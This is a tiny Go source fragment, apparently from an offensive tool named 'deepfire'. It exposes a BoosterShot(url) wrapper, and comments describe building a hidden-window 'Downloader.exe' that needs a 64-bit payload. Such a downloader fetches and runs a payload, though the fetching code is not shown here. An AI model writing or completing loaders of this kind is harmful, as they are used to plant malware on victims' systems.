//If this is compiled in 64bit the Payload MUST be 64bit!
//go build -o Downloader.exe -ldflags "-H windowsgui" "C:\main.go"
package deepfire

func BoosterShot(url string) {
	boosterShot(url)
}
